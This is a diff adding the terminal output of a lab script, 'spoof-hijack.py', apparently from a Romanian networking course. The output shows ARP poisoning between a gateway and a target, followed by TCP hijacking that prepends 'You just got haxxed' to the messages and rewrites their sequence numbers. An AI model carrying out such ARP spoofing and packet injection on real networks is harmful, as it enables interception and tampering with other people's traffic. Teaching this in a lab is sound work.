@@ -1,0 +1,629 @@
+root@81724ae2edd2:/elocal/capitolul3/tcp-hijacking# python3 spoof-hijack.py 
+[*] Porneste script-ul...
+[*] Gateway IP address: 198.10.0.1
+[*] Target IP address: 198.10.0.2
+Begin emission:
+Finished sending 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+[*] Gateway MAC address: 02:42:c6:0a:00:01
+Begin emission:
+Finished sending 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+[*] Target MAC address: 02:42:c6:0a:00:02
+[*] Am pornit atacul de tip ARP poison [CTRL-C pentru a opri]
+[*] Pornim captarea pachetelor pe placa de retea. Packet Count: 1000. Filter: ip host 198.10.0.2
+[*] Stopping network capture..Restoring network
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 60
+  id        = 36998
+  flags     = DF
+  frag      = 0
+  ttl       = 62
+  proto     = tcp
+  chksum    = 0x201e
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588345
+     ack       = 0
+     dataofs   = 10
+     reserved  = 0
+     flags     = S
+     window    = 64240
+     chksum    = 0xaf37
+     urgptr    = 0
+     options   = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (3760682192, 0)), ('NOP', None), ('WScale', 7)]
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xeeb7
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588345
+     ack       = 0
+     dataofs   = 5
+     reserved  = 0
+     flags     = S
+     window    = 8192
+     chksum    = 0x4703
+     urgptr    = 0
+     options   = []
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 44
+  id        = 0
+  flags     = DF
+  frag      = 0
+  ttl       = 63
+  proto     = tcp
+  chksum    = 0xafb4
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498729
+     ack       = 1571588346
+     dataofs   = 6
+     reserved  = 0
+     flags     = SA
+     window    = 64240
+     chksum    = 0xcf7
+     urgptr    = 0
+     options   = [('MSS', 1460)]
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xeeb7
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498729
+     ack       = 1571588346
+     dataofs   = 5
+     reserved  = 0
+     flags     = SA
+     window    = 8192
+     chksum    = 0xffa3
+     urgptr    = 0
+     options   = []
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 36999
+  flags     = DF
+  frag      = 0
+  ttl       = 62
+  proto     = tcp
+  chksum    = 0x2031
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588346
+     ack       = 1709498730
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 64240
+     chksum    = 0x24b4
+     urgptr    = 0
+     options   = []
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xeeb7
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588346
+     ack       = 1709498730
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 8192
+     chksum    = 0xffa4
+     urgptr    = 0
+     options   = []
+
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 53
+  id        = 37000
+  flags     = DF
+  frag      = 0
+  ttl       = 62
+  proto     = tcp
+  chksum    = 0x2023
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588346
+     ack       = 1709498730
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 64240
+     chksum    = 0x4554
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'MesajOriginal'
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 76
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xee93
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588346
+     ack       = 1709498730
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 8192
+     chksum    = 0xcc9f
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'You just got haxxed -> MesajOriginal'
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 15468
+  flags     = DF
+  frag      = 0
+  ttl       = 63
+  proto     = tcp
+  chksum    = 0x734c
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498730
+     ack       = 1571588382
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 64204
+     chksum    = 0x24b4
+     urgptr    = 0
+     options   = []
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xeeb7
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498730
+     ack       = 1571588359
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 8192
+     chksum    = 0xff97
+     urgptr    = 0
+     options   = []
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 101
+  id        = 15469
+  flags     = DF
+  frag      = 0
+  ttl       = 63
+  proto     = tcp
+  chksum    = 0x730e
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498730
+     ack       = 1571588382
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 64204
+     chksum    = 0xb3b2
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'Server a primit mesajul: You just got haxxed -> MesajOriginal'
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 124
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xee63
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498730
+     ack       = 1571588359
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 8192
+     chksum    = 0x5ad1
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'You just got haxxed -> Server a primit mesajul: You just got haxxed -> MesajOriginal'
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 37001
+  flags     = DF
+  frag      = 0
+  ttl       = 62
+  proto     = tcp
+  chksum    = 0x202f
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588359
+     ack       = 1709498814
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 64156
+     chksum    = 0x24a7
+     urgptr    = 0
+     options   = []
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xeeb7
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588382
+     ack       = 1709498791
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 8192
+     chksum    = 0xff43
+     urgptr    = 0
+     options   = []
+
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 53
+  id        = 37002
+  flags     = DF
+  frag      = 0
+  ttl       = 62
+  proto     = tcp
+  chksum    = 0x2021
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588359
+     ack       = 1709498814
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 64156
+     chksum    = 0x4547
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'MesajOriginal'
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 76
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xee93
+  src       = 198.10.0.1
+  dst       = 198.10.0.2
+  \options   \
+###[ TCP ]### 
+     sport     = 44816
+     dport     = 10001
+     seq       = 1571588382
+     ack       = 1709498791
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 8192
+     chksum    = 0xcc3e
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'You just got haxxed -> MesajOriginal'
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 15470
+  flags     = DF
+  frag      = 0
+  ttl       = 63
+  proto     = tcp
+  chksum    = 0x734a
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498791
+     ack       = 1571588418
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 64168
+     chksum    = 0x2477
+     urgptr    = 0
+     options   = []
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 40
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xeeb7
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498814
+     ack       = 1571588372
+     dataofs   = 5
+     reserved  = 0
+     flags     = A
+     window    = 8192
+     chksum    = 0xff36
+     urgptr    = 0
+     options   = []
+
+.
+Sent 1 packets.
+Pachet initial:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 101
+  id        = 15471
+  flags     = DF
+  frag      = 0
+  ttl       = 63
+  proto     = tcp
+  chksum    = 0x730c
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498791
+     ack       = 1571588418
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 64168
+     chksum    = 0xb375
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'Server a primit mesajul: You just got haxxed -> MesajOriginal'
+
+Pachet dupa:
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 124
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xee63
+  src       = 198.10.0.2
+  dst       = 198.10.0.1
+  \options   \
+###[ TCP ]### 
+     sport     = 10001
+     dport     = 44816
+     seq       = 1709498814
+     ack       = 1571588372
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 8192
+     chksum    = 0x5a70
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'You just got haxxed -> Server a primit mesajul: You just got haxxed -> MesajOriginal'
+
+
+....
